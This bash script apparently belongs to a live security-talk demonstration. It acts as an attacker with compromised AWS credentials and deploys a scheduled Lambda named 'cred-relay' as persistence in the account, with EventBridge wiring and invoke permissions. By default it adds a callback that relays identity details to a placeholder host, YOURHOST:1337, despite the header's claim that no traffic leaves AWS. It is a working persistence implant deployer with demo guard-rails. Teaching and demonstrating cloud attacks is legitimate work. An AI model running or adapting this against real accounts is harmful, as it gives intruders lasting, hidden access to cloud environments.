#!/usr/bin/env bash
# Speaker Part B, step 1: deploy the persistence Lambda and EventBridge schedule
# live from the projector session.
#
# Prereqs:
#   - terraform/speaker-demo applied
#   - Speaker AWS credentials active (admin or equivalent)
#   - LAMBDA_EXEC_ROLE_ARN from terraform output
#   - AWS_REGION set
#
# Demonstration narrative:
#   "This Lambda was never deployed by this org. I created it right now using
#    the same AWS session an attacker would have after compromising the build
#    role. It will fire every 2 minutes from now on, and every invocation proves
#    fresh access and visibility into the account. No traffic
#    leaves AWS. No endpoint is implanted. No process runs on a host."
set -euo pipefail

: "${LAMBDA_EXEC_ROLE_ARN:?set LAMBDA_EXEC_ROLE_ARN from terraform output}"
: "${AWS_REGION:?set AWS_REGION}"

NAME_PREFIX="${NAME_PREFIX:-rtv-speaker-demo}"
FUNCTION_NAME="${NAME_PREFIX}-cred-relay"
RULE_NAME="${NAME_PREFIX}-cred-relay-trigger"
SCHEDULE="${SCHEDULE:-rate(2 minutes)}"
ENABLE_PROOF_CALLBACK="${ENABLE_PROOF_CALLBACK:-1}"
PROOF_CALLBACK_URL="${PROOF_CALLBACK_URL:-https://YOURHOST:1337/}"
PROOF_DETAIL_MODE="${PROOF_DETAIL_MODE:-identity}"
[[ "$PROOF_DETAIL_MODE" == "basic" || "$PROOF_DETAIL_MODE" == "identity" ]] || {
  echo "ERROR: PROOF_DETAIL_MODE must be basic or identity" >&2
  exit 1
}
if [[ "$ENABLE_PROOF_CALLBACK" == "1" ]]; then
  [[ "$PROOF_CALLBACK_URL" == "https://YOURHOST:1337/" ]] || {
    echo "ERROR: opt-in callback URL must be exactly https://YOURHOST:1337/" >&2
    exit 1
  }
  PROOF_CALLBACK_CA_FILE="${PROOF_CALLBACK_CA_FILE:-/tmp/rtv-proof-listener-ca.pem}"
  [[ -r "$PROOF_CALLBACK_CA_FILE" ]] || {
    echo "ERROR: start-proof-listener.sh must be running before callback deployment" >&2
    exit 1
  }
elif [[ "$ENABLE_PROOF_CALLBACK" != "0" ]]; then
  echo "ERROR: ENABLE_PROOF_CALLBACK must be 0 or 1" >&2
  exit 1
else
  PROOF_CALLBACK_URL=""
fi
LAMBDA_ENVIRONMENT="Variables={PROOF_CALLBACK_URL=${PROOF_CALLBACK_URL},PROOF_SESSION_LABEL=${NAME_PREFIX},PROOF_DETAIL_MODE=${PROOF_DETAIL_MODE}}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC_DIR="${SCRIPT_DIR}/lambda-src"
BUILD_DIR="$(mktemp -d)"
trap 'rm -rf "$BUILD_DIR"' EXIT

echo "[1/5] Packaging Lambda..."
cp "${SRC_DIR}/index.py" "${BUILD_DIR}/"
if [[ "$ENABLE_PROOF_CALLBACK" == "1" ]]; then
  cp "$PROOF_CALLBACK_CA_FILE" "${BUILD_DIR}/proof-listener-ca.pem"
fi
cd "$BUILD_DIR"
zip -q lambda.zip index.py
if [[ "$ENABLE_PROOF_CALLBACK" == "1" ]]; then
  zip -q lambda.zip proof-listener-ca.pem
fi
ZIP_PATH="${BUILD_DIR}/lambda.zip"
cd - >/dev/null

echo "[2/5] Creating Lambda function ${FUNCTION_NAME}..."
# If the function exists from a previous run, update it instead
if aws lambda get-function --function-name "$FUNCTION_NAME" --region "$AWS_REGION" >/dev/null 2>&1; then
  echo "      function exists, updating code"
  aws lambda update-function-code \
    --function-name "$FUNCTION_NAME" \
    --zip-file "fileb://${ZIP_PATH}" \
    --region "$AWS_REGION" >/dev/null
  aws lambda wait function-updated-v2 \
    --function-name "$FUNCTION_NAME" \
    --region "$AWS_REGION"
  aws lambda update-function-configuration \
    --function-name "$FUNCTION_NAME" \
    --environment "$LAMBDA_ENVIRONMENT" \
    --region "$AWS_REGION" >/dev/null
  aws lambda wait function-updated-v2 \
    --function-name "$FUNCTION_NAME" \
    --region "$AWS_REGION"
else
  aws lambda create-function \
    --function-name "$FUNCTION_NAME" \
    --runtime "python3.12" \
    --role "$LAMBDA_EXEC_ROLE_ARN" \
    --handler "index.lambda_handler" \
    --zip-file "fileb://${ZIP_PATH}" \
    --timeout 30 \
    --environment "$LAMBDA_ENVIRONMENT" \
    --region "$AWS_REGION" >/dev/null
  aws lambda wait function-active-v2 \
    --function-name "$FUNCTION_NAME" \
    --region "$AWS_REGION"
fi

LAMBDA_ARN=$(aws lambda get-function \
  --function-name "$FUNCTION_NAME" \
  --query 'Configuration.FunctionArn' --output text \
  --region "$AWS_REGION")
echo "      Lambda ARN: $LAMBDA_ARN"

echo "[3/5] Creating EventBridge schedule ${RULE_NAME} (${SCHEDULE})..."
aws events put-rule \
  --name "$RULE_NAME" \
  --schedule-expression "$SCHEDULE" \
  --state ENABLED \
  --region "$AWS_REGION" >/dev/null

RULE_ARN=$(aws events describe-rule \
  --name "$RULE_NAME" \
  --query Arn --output text \
  --region "$AWS_REGION")

echo "[4/5] Wiring the rule to the Lambda..."
aws events put-targets \
  --rule "$RULE_NAME" \
  --targets "Id=1,Arn=${LAMBDA_ARN}" \
  --region "$AWS_REGION" >/dev/null

# EventBridge needs permission to invoke the Lambda
aws lambda add-permission \
  --function-name "$FUNCTION_NAME" \
  --statement-id "${RULE_NAME}-invoke" \
  --action "lambda:InvokeFunction" \
  --principal "events.amazonaws.com" \
  --source-arn "$RULE_ARN" \
  --region "$AWS_REGION" 2>/dev/null || echo "      (permission already set)"

echo "[5/5] Firing Lambda once immediately to prove it works..."
aws lambda invoke \
  --function-name "$FUNCTION_NAME" \
  --region "$AWS_REGION" \
  /dev/null >/dev/null
sleep 2

LOG_GROUP="/aws/lambda/${FUNCTION_NAME}"
echo ""
echo "Persistence is live. Follow the logs with:"
echo "  aws logs tail ${LOG_GROUP} --since 5m --follow --region ${AWS_REGION}"
echo ""
echo "Rule schedule: ${SCHEDULE}. The Lambda will re-fire automatically."
echo "Run 02-abuse-iam-chain.sh next."
